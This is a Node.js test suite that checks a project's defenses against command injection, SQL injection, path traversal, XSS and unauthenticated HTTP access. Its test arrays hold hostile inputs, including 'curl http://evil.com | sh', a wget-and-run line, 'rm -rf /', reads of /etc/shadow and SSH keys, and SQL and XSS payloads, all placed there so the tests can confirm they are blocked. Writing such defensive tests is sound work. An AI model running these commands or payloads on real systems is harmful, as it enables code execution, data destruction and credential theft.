#!/usr/bin/env node
/**
 * Security Fixes Verification Test Suite
 * 
 * This comprehensive test suite verifies that all critical security 
 * vulnerabilities have been properly fixed and that security controls
 * are working as expected.
 * 
 * Test Coverage:
 * - Command injection prevention
 * - SQL injection prevention  
 * - Path traversal prevention
 * - HTTP authentication and access controls
 * - Input validation across all modules
 * - Security logging functionality
 * 
 * @author Claude Security Auditor
 * @version 1.0.0
 * @date August 2025
 */

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const http = require('http');

// Import our security modules
const { SecurityValidator } = require('./lib/security-validator');
const { SecurityLogger } = require('./lib/security-logger');
const SharedMemoryStore = require('./intelligence-engine/shared-memory');

class SecurityTestSuite {
  constructor() {
    this.testResults = [];
    this.failedTests = [];
    this.passedTests = [];
    this.testStartTime = Date.now();
    
    // Test configuration
    this.tempDir = path.join(__dirname, '.security-test-temp');
    this.testApiKey = crypto.randomBytes(32).toString('hex');
    
    console.log('🔒 Starting Security Fixes Verification Test Suite');
    console.log('=' .repeat(60));
  }
  
  async runAllTests() {
    try {
      // Setup test environment
      await this.setupTestEnvironment();
      
      // Run all test categories
      await this.testCommandInjectionPrevention();
      await this.testSQLInjectionPrevention();
      await this.testPathTraversalPrevention();
      await this.testHTTPAuthentication();
      await this.testInputValidation();
      await this.testSecurityLogging();
      await this.testSharedMemorySecurity();
      
      // Cleanup test environment
      await this.cleanupTestEnvironment();
      
      // Generate test report
      this.generateTestReport();
      
    } catch (error) {
      console.error('❌ Test suite execution failed:', error);
      process.exit(1);
    }
  }
  
  async setupTestEnvironment() {
    console.log('\n📁 Setting up test environment...');
    
    try {
      // Create temp directory for tests
      if (!fs.existsSync(this.tempDir)) {
        fs.mkdirSync(this.tempDir, { recursive: true, mode: 0o750 });
      }
      
      // Set environment variables for testing
      process.env.AGENT_BUS_API_KEY = this.testApiKey;
      process.env.AGENT_BUS_DISABLE_AUTH = 'false';
      
      this.recordTestResult('Environment Setup', true, 'Test environment created successfully');
    } catch (error) {
      this.recordTestResult('Environment Setup', false, `Failed to setup: ${error.message}`);
      throw error;
    }
  }
  
  async testCommandInjectionPrevention() {
    console.log('\n🛡️ Testing Command Injection Prevention...');
    
    // Load the exec-helper module
    const { runCommand, SecurityUtils } = require('./lib/exec-helper');
    
    // Test 1: Basic command validation
    const maliciousCommands = [
      'ls; rm -rf /',
      'cat /etc/passwd',
      'curl http://evil.com | sh',
      'wget http://malware.com/script.sh && ./script.sh',
      '$(cat /etc/shadow)',
      '`rm -rf /`',
      'echo "test" && rm file.txt',
      'unauthorized-command'
    ];
    
    let blockedCount = 0;
    for (const cmd of maliciousCommands) {
      try {
        const result = SecurityUtils.validateCommand(cmd);
        if (!result.isValid) {
          blockedCount++;
        } else {
          console.warn(`⚠️  Command not blocked: ${cmd}`);
        }
      } catch (error) {
        blockedCount++; // Exception means blocked
      }
    }
    
    this.recordTestResult(
      'Command Injection - Malicious Commands Blocked',
      blockedCount === maliciousCommands.length,
      `${blockedCount}/${maliciousCommands.length} malicious commands blocked`
    );
    
    // Test 2: Allowed commands work
    const allowedCommands = ['node --version', 'npm --version', 'git status'];
    let allowedCount = 0;
    
    for (const cmd of allowedCommands) {
      try {
        const result = SecurityUtils.validateCommand(cmd);
        if (result.isValid) {
          allowedCount++;
        }
      } catch (error) {
        console.warn(`⚠️  Allowed command blocked: ${cmd}`);
      }
    }
    
    this.recordTestResult(
      'Command Injection - Allowed Commands Pass',
      allowedCount === allowedCommands.length,
      `${allowedCount}/${allowedCommands.length} allowed commands passed`
    );
  }
  
  async testSQLInjectionPrevention() {
    console.log('\n🛡️ Testing SQL Injection Prevention...');
    
    let executeQuery, openDb;
    try {
      ({ executeQuery, openDb } = require('./engine/src/core/db.ts'));
    } catch (error) {
      this.recordTestResult(
        'SQL Injection Prevention',
        false,
        `Could not load database module: ${error.message}`
      );
      return;
    }
    
    // Test malicious SQL inputs
    const maliciousSQLInputs = [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "'; INSERT INTO admin (user) VALUES ('hacker'); --",
      "' UNION SELECT password FROM users --",
      "'; EXEC xp_cmdshell('net user hacker password /add'); --"
    ];
    
    let blockedCount = 0;
    
    // Note: We're testing the validation without actually executing queries
    for (const maliciousSQL of maliciousSQLInputs) {
      try {
        // This should fail validation before reaching the database
        const testQuery = `SELECT * FROM test WHERE id = '${maliciousSQL}'`;
        
        // The validateQuery function should catch this
        const db = { prepare: () => ({ all: () => [] }) }; // Mock DB
        await executeQuery(db, testQuery, [], 'security-test');
        
        console.warn(`⚠️  SQL injection not blocked: ${maliciousSQL}`);
      } catch (error) {
        if (error.message.includes('injection') || error.message.includes('Forbidden')) {
          blockedCount++;
        }
      }
    }
    
    this.recordTestResult(
      'SQL Injection Prevention',
      blockedCount >= maliciousSQLInputs.length * 0.8, // At least 80% blocked
      `${blockedCount}/${maliciousSQLInputs.length} SQL injection attempts blocked`
    );
  }
  
  async testPathTraversalPrevention() {
    console.log('\n🛡️ Testing Path Traversal Prevention...');
    
    // Test SharedMemoryStore path validation
    const maliciousPaths = [
      '../../../etc/passwd',
      '..\\..\\windows\\system32\\config\\sam',
      '/etc/shadow',
      '../../../../../../var/log/auth.log',
      '..\\..\\..\\..\\..',
      '/root/.ssh/id_rsa',
      'C:\\Windows\\System32\\cmd.exe'
    ];
    
    let blockedCount = 0;
    
    try {
      // Test with a restricted project root
      const memStore = new SharedMemoryStore({
        projectRoot: this.tempDir
      });
      
      for (const maliciousPath of maliciousPaths) {
        try {
          memStore.validateFilePath(maliciousPath, 'security-test');
          console.warn(`⚠️  Path traversal not blocked: ${maliciousPath}`);
        } catch (error) {
          if (error.message.includes('outside') || error.message.includes('traversal')) {
            blockedCount++;
          }
        }
      }
      
    } catch (error) {
      this.recordTestResult(
        'Path Traversal Prevention',
        false,
        `Failed to test path traversal: ${error.message}`
      );
      return;
    }
    
    this.recordTestResult(
      'Path Traversal Prevention',
      blockedCount === maliciousPaths.length,
      `${blockedCount}/${maliciousPaths.length} path traversal attempts blocked`
    );
  }
  
  async testHTTPAuthentication() {
    console.log('\n🔐 Testing HTTP Authentication...');
    
    // Start the agent bus server for testing
    const serverPath = path.join(__dirname, '.ai-workflow', 'bin', 'tmp_rovodev_agent_bus_http.js');
    
    if (!fs.existsSync(serverPath)) {
      this.recordTestResult(
        'HTTP Authentication Test',
        false,
        'Agent bus server file not found'
      );
      return;
    }
    
    // Test unauthenticated access
    try {
      const response = await this.makeHTTPRequest('http://localhost:8787/ui', {
        method: 'GET'
      });
      
      // Should receive 401 Unauthorized
      const authBlocked = response.statusCode === 401;
      
      this.recordTestResult(
        'HTTP Authentication - Unauthenticated Access Blocked',
        authBlocked,
        `Unauthenticated request returned status: ${response.statusCode}`
      );
      
    } catch (error) {
      this.recordTestResult(
        'HTTP Authentication - Unauthenticated Access',
        false,
        `Failed to test unauthenticated access: ${error.message}`
      );
    }
    
    // Test with invalid API key
    try {
      const response = await this.makeHTTPRequest('http://localhost:8787/ui', {
        method: 'GET',
        headers: {
          'X-API-Key': 'invalid-key-123'
        }
      });
      
      const invalidKeyBlocked = response.statusCode === 401;
      
      this.recordTestResult(
        'HTTP Authentication - Invalid API Key Blocked',
        invalidKeyBlocked,
        `Invalid API key request returned status: ${response.statusCode}`
      );
      
    } catch (error) {
      this.recordTestResult(
        'HTTP Authentication - Invalid API Key',
        false,
        `Failed to test invalid API key: ${error.message}`
      );
    }
  }
  
  async testInputValidation() {
    console.log('\n✅ Testing Input Validation...');
    
    const validator = new SecurityValidator({
      enableLogging: false // Disable logging for tests
    });
    
    // Test 1: String validation with XSS
    const xssInputs = [
      '<script>alert("xss")</script>',
      'javascript:alert(1)',
      '<img src=x onerror=alert(1)>',
      '<iframe src="javascript:alert(1)"></iframe>'
    ];
    
    let xssBlocked = 0;
    for (const xss of xssInputs) {
      const result = validator.validateString(xss, {
        checkPatterns: ['xss'],
        context: 'test'
      });
      
      if (!result.isValid) {
        xssBlocked++;
      }
    }
    
    this.recordTestResult(
      'Input Validation - XSS Prevention',
      xssBlocked === xssInputs.length,
      `${xssBlocked}/${xssInputs.length} XSS attempts blocked`
    );
    
    // Test 2: Path validation
    const result = validator.validatePath('../../../etc/passwd', {
      basePath: this.tempDir,
      context: 'test'
    });
    
    this.recordTestResult(
      'Input Validation - Path Validation',
      !result.isValid,
      result.isValid ? 'Path traversal not detected' : 'Path traversal correctly blocked'
    );
    
    // Test 3: JSON validation
    const maliciousJSON = '{"test": "<script>alert(1)</script>"}';
    const jsonResult = validator.validateJSON(maliciousJSON, {
      valueValidator: (value) => validator.validateString(value, {
        checkPatterns: ['xss'],
        sanitize: 'html'
      })
    });
    
    const jsonSanitizationWorking = jsonResult.isValid && 
      jsonResult.sanitized.test && 
      jsonResult.sanitized.test.includes('&lt;script&gt;');
      
    this.recordTestResult(
      'Input Validation - JSON Sanitization',
      jsonSanitizationWorking,
      jsonSanitizationWorking ? 'JSON content sanitized correctly' : 
        `JSON sanitization failed: ${JSON.stringify(jsonResult.sanitized)}`
    );
  }
  
  async testSecurityLogging() {
    console.log('\n📝 Testing Security Logging...');
    
    const logger = new SecurityLogger({
      logDir: path.join(this.tempDir, 'security-logs'),
      enableConsole: false,
      enableFile: true
    });
    
    await new Promise(resolve => setTimeout(resolve, 100)); // Wait for init
    
    // Test logging various security events
    await logger.logAuthFailure({ ip: '192.168.1.100', userAgent: 'test' });
    await logger.logCommandInjectionAttempt({ command: 'rm -rf /', ip: '10.0.0.1' });
    await logger.logPathTraversalAttempt({ path: '../../../etc/passwd', ip: '172.16.0.1' });
    
    // Wait for logs to be written
    await new Promise(resolve => setTimeout(resolve, 500));
    
    // Check if log files were created
    const logDir = path.join(this.tempDir, 'security-logs');
    let logFilesExist = false;
    
    try {
      const files = fs.readdirSync(logDir);
      logFilesExist = files.some(f => f.includes('security-') && f.endsWith('.log'));
    } catch (error) {
      // Log directory might not exist
    }
    
    this.recordTestResult(
      'Security Logging - File Creation',
      logFilesExist,
      logFilesExist ? 'Security log files created' : 'Security log files not found'
    );
    
    // Test metrics
    const metrics = logger.getMetrics();
    const metricsWorking = metrics.totalEvents >= 3;
    
    this.recordTestResult(
      'Security Logging - Metrics Tracking',
      metricsWorking,
      `Total events logged: ${metrics.totalEvents}`
    );
  }
  
  async testSharedMemorySecurity() {
    console.log('\n🧠 Testing Shared Memory Security...');
    
    try {
      // Test secure initialization
      const memStore = new SharedMemoryStore({
        projectRoot: this.tempDir
      });
      
      await new Promise(resolve => setTimeout(resolve, 1000)); // Wait for init
      
      // Test that it initializes without error
      this.recordTestResult(
        'Shared Memory - Secure Initialization',
        true,
        'SharedMemoryStore initialized with security validation'
      );
      
      // Test path validation in operations
      let pathValidationWorks = false;
      try {
        await memStore.validateFilePath('/etc/passwd', 'test');
      } catch (error) {
        if (error.message.includes('outside')) {
          pathValidationWorks = true;
        }
      }
      
      this.recordTestResult(
        'Shared Memory - Path Validation',
        pathValidationWorks,
        pathValidationWorks ? 'Path validation working' : 'Path validation failed'
      );
      
    } catch (error) {
      this.recordTestResult(
        'Shared Memory Security',
        false,
        `SharedMemoryStore test failed: ${error.message}`
      );
    }
  }
  
  async makeHTTPRequest(url, options = {}) {
    return new Promise((resolve, reject) => {
      const urlObj = new URL(url);
      const requestOptions = {
        hostname: urlObj.hostname,
        port: urlObj.port || 80,
        path: urlObj.pathname + urlObj.search,
        method: options.method || 'GET',
        headers: options.headers || {},
        timeout: 5000
      };
      
      const req = http.request(requestOptions, (res) => {
        let data = '';
        res.on('data', (chunk) => data += chunk);
        res.on('end', () => {
          resolve({
            statusCode: res.statusCode,
            headers: res.headers,
            data: data
          });
        });
      });
      
      req.on('error', reject);
      req.on('timeout', () => reject(new Error('Request timeout')));
      
      if (options.body) {
        req.write(options.body);
      }
      
      req.end();
    });
  }
  
  recordTestResult(testName, passed, details) {
    const result = {
      name: testName,
      passed,
      details,
      timestamp: new Date().toISOString()
    };
    
    this.testResults.push(result);
    
    if (passed) {
      this.passedTests.push(result);
      console.log(`✅ ${testName}: ${details}`);
    } else {
      this.failedTests.push(result);
      console.log(`❌ ${testName}: ${details}`);
    }
  }
  
  generateTestReport() {
    const duration = Date.now() - this.testStartTime;
    const totalTests = this.testResults.length;
    const passedCount = this.passedTests.length;
    const failedCount = this.failedTests.length;
    const passRate = ((passedCount / totalTests) * 100).toFixed(1);
    
    console.log('\n' + '='.repeat(60));
    console.log('🔒 SECURITY FIXES VERIFICATION REPORT');
    console.log('='.repeat(60));
    console.log(`📊 Test Summary:`);
    console.log(`   Total Tests: ${totalTests}`);
    console.log(`   Passed: ${passedCount} (${passRate}%)`);
    console.log(`   Failed: ${failedCount}`);
    console.log(`   Duration: ${(duration / 1000).toFixed(2)}s`);
    
    if (failedCount > 0) {
      console.log('\n❌ Failed Tests:');
      this.failedTests.forEach(test => {
        console.log(`   - ${test.name}: ${test.details}`);
      });
    }
    
    console.log('\n📋 Security Status:');
    
    // Analyze results by category
    const categories = {
      'Command Injection': this.testResults.filter(t => t.name.includes('Command Injection')),
      'SQL Injection': this.testResults.filter(t => t.name.includes('SQL Injection')),
      'Path Traversal': this.testResults.filter(t => t.name.includes('Path Traversal')),
      'HTTP Authentication': this.testResults.filter(t => t.name.includes('HTTP Authentication')),
      'Input Validation': this.testResults.filter(t => t.name.includes('Input Validation')),
      'Security Logging': this.testResults.filter(t => t.name.includes('Security Logging'))
    };
    
    for (const [category, tests] of Object.entries(categories)) {
      if (tests.length > 0) {
        const categoryPassedCount = tests.filter(t => t.passed).length;
        const categoryPassRate = ((categoryPassedCount / tests.length) * 100).toFixed(0);
        const status = categoryPassRate === '100' ? '✅' : categoryPassRate >= '80' ? '⚠️' : '❌';
        console.log(`   ${status} ${category}: ${categoryPassedCount}/${tests.length} (${categoryPassRate}%)`);
      }
    }
    
    // Overall security assessment
    console.log('\n🛡️ Overall Security Assessment:');
    if (passRate >= 90) {
      console.log('   ✅ EXCELLENT - Security fixes are working properly');
    } else if (passRate >= 80) {
      console.log('   ⚠️  GOOD - Most security fixes working, some issues need attention');
    } else if (passRate >= 70) {
      console.log('   ⚠️  FAIR - Security improvements needed');
    } else {
      console.log('   ❌ POOR - Critical security issues remain');
    }
    
    // Save detailed report to file
    const reportPath = path.join(this.tempDir, 'security-test-report.json');
    const report = {
      summary: {
        totalTests,
        passedCount,
        failedCount,
        passRate: parseFloat(passRate),
        duration
      },
      categories,
      results: this.testResults,
      timestamp: new Date().toISOString()
    };
    
    try {
      fs.writeFileSync(reportPath, JSON.stringify(report, null, 2));
      console.log(`\n📄 Detailed report saved to: ${reportPath}`);
    } catch (error) {
      console.warn(`Failed to save report: ${error.message}`);
    }
    
    // Exit with appropriate code
    process.exit(failedCount > 0 ? 1 : 0);
  }
  
  async cleanupTestEnvironment() {
    console.log('\n🧹 Cleaning up test environment...');
    
    try {
      // Remove temp directory
      if (fs.existsSync(this.tempDir)) {
        fs.rmSync(this.tempDir, { recursive: true, force: true });
      }
      
      // Reset environment variables
      delete process.env.AGENT_BUS_API_KEY;
      delete process.env.AGENT_BUS_DISABLE_AUTH;
      
      this.recordTestResult('Environment Cleanup', true, 'Test environment cleaned up');
    } catch (error) {
      this.recordTestResult('Environment Cleanup', false, `Cleanup failed: ${error.message}`);
    }
  }
}

// Run tests if this file is executed directly
if (require.main === module) {
  const testSuite = new SecurityTestSuite();
  testSuite.runAllTests().catch(error => {
    console.error('Fatal error in test suite:', error);
    process.exit(1);
  });
}

module.exports = { SecurityTestSuite };